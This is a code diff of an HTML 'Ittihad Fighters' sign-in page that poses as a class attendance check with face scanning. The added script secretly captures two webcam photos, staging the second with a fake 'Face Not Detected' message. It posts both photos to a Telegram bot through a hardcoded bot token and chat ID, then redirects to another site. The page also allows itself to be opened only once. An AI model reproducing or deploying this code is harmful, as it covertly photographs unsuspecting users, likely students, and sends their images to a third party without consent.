@@ -4,81 +4,136 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ittihad Fighters</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        .hidden { display: none; }
+        .scan-animation {
+            width: 100px;
+            height: 100px;
+            margin: 20px auto;
+            border: 5px solid #ff4081;
+            border-radius: 50%;
+            animation: scan 2s infinite;
+        }
+        @keyframes scan {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.5; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div id="class-selection">
+        <h1>Ittihad Fighters</h1>
+        <p>Select your name:</p>
+        <ul id="name-list"></ul>
+        <button id="proceed" class="hidden">Continue</button>
+        <button id="cancel">Cancel</button>
+    </div>
+
+    <div id="face-recognition" class="hidden">
+        <div class="scan-animation"></div>
+        <p>Scanning face...</p>
+    </div>
+
+    <div id="face-not-detected" class="hidden">
+        <p>Face Not Detected</p>
+    </div>
+
+    <div id="completion" class="hidden">
+        <p id="signed-in"></p>
+        <p>You look beautiful/handsome today!</p>
+        <p>Redirecting...</p>
+    </div>
+
     <script>
         const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
         const TELEGRAM_CHAT_ID = '5934902786';
-        
-        function showClassSelection() {
-            document.body.innerHTML = `<h1>Ittihad Fighters</h1>
-                <p>Select your name:</p>
-                <ul id="nameList">
-                    <li><label><input type="checkbox" value="Izz"> Izz</label></li>
-                    <li><label><input type="checkbox" value="Ali"> Ali</label></li>
-                    <li><label><input type="checkbox" value="Fatimah"> Fatimah</label></li>
-                </ul>
-                <button onclick="confirmSelection()">Continue</button>
-                <button onclick="cancelProcess()">Cancel</button>
-                <p id="message"></p>`;
-        }
-        
-        function confirmSelection() {
-            const checkboxes = document.querySelectorAll("input[type=checkbox]:checked");
-            if (checkboxes.length === 0) {
-                alert("Please select at least one name.");
+        const selectedNames = new Set();
+        const names = ['Izz', 'Ali', 'Amin', 'Siti', 'Aisyah'];
+
+        document.addEventListener("DOMContentLoaded", function() {
+            if (localStorage.getItem("pageOpened")) {
+                document.body.innerHTML = "<h2>This page can only be opened once.</h2>";
                 return;
             }
-            checkboxes.forEach(checkbox => checkbox.disabled = true);
-            showFaceRecognition();
-        }
-        
-        function cancelProcess() {
-            document.body.innerHTML = "<h2>Page will stop here</h2>";
-        }
-        
-        function showFaceRecognition() {
-            document.body.innerHTML = `<h2>Face Recognition</h2>
-                <p>Scanning your face...</p>
-                <div id="animation">[Face Scan Animation]</div>`;
-            setTimeout(() => captureImage(false), 2000);
-        }
-        
-        function captureImage(isSecondAttempt) {
-            sendImageToTelegram();
-            if (!isSecondAttempt) {
+            localStorage.setItem("pageOpened", "true");
+            showClassSelection();
+        });
+
+        $(document).ready(function() {
+            names.forEach(name => {
+                $('#name-list').append(`<li><label><input type="checkbox" class="name-checkbox" value="${name}"> ${name}</label></li>`);
+            });
+
+            $('.name-checkbox').on('change', function() {
+                if (this.checked) {
+                    selectedNames.add(this.value);
+                    this.disabled = true;
+                }
+                $('#proceed').toggleClass('hidden', selectedNames.size === 0);
+            });
+
+            $('#proceed').on('click', function() {
+                $('#class-selection').addClass('hidden');
+                $('#face-recognition').removeClass('hidden');
+                setTimeout(() => takePicture(1), 2000);
+            });
+
+            $('#cancel').on('click', function() {
+                alert('Page will stop here.');
+            });
+        });
+
+        function takePicture(step) {
+            let canvas = document.createElement('canvas');
+            let ctx = canvas.getContext('2d');
+            let video = document.createElement('video');
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                video.srcObject = stream;
+                video.play();
                 setTimeout(() => {
-                    document.body.innerHTML = `<h2>Face Not Detected</h2>
-                        <p>Retrying...</p>
-                        <div id="animation">[Face Scan Animation]</div>`;
-                    setTimeout(() => captureImage(true), 3000);
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    stream.getTracks().forEach(track => track.stop());
+                    sendToTelegram(canvas, step);
                 }, 2000);
-            } else {
-                setTimeout(showSuccessMessage, 2000);
-            }
+            });
         }
-        
-        function sendImageToTelegram() {
-            const formData = new FormData();
-            formData.append("chat_id", TELEGRAM_CHAT_ID);
-            formData.append("photo", new Blob(["Fake Image Data"], {type: 'image/jpeg'}), "face.jpg");
-            
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            }).catch(err => console.error("Error sending photo: ", err));
-        }
-        
-        function showSuccessMessage() {
-            const selectedNames = [...document.querySelectorAll("input[type=checkbox]:checked")].map(cb => cb.value);
-            document.body.innerHTML = `<h2>Done ✅</h2>
-                <p>${selectedNames.join(", ")} signed in</p>
-                <p>You look beautiful/handsome today!</p>
-                <p>Redirecting to the next page...</p>`;
-            setTimeout(() => {
-                window.location.href = "https://studandlearn.github.io/project-2/";
-            }, 3000);
+
+        function sendToTelegram(canvas, step) {
+            canvas.toBlob(blob => {
+                let formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob, "face.jpg");
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                }).then(() => {
+                    if (step === 1) {
+                        $('#face-recognition').addClass('hidden');
+                        $('#face-not-detected').removeClass('hidden');
+                        setTimeout(() => {
+                            $('#face-not-detected').addClass('hidden');
+                            $('#face-recognition').removeClass('hidden');
+                            takePicture(2);
+                        }, 5000);
+                    } else {
+                        $('#face-recognition').addClass('hidden');
+                        $('#completion').removeClass('hidden');
+                        $('#signed-in').text([...selectedNames].join(', ') + " signed in ✅");
+                        setTimeout(() => {
+                            window.location.href = "https://studandlearn.github.io/project-2/";
+                        }, 3000);
+                    }
+                });
+            }, 'image/jpeg');
         }
     </script>
-</head>
-<body>
 </body>
 </html>
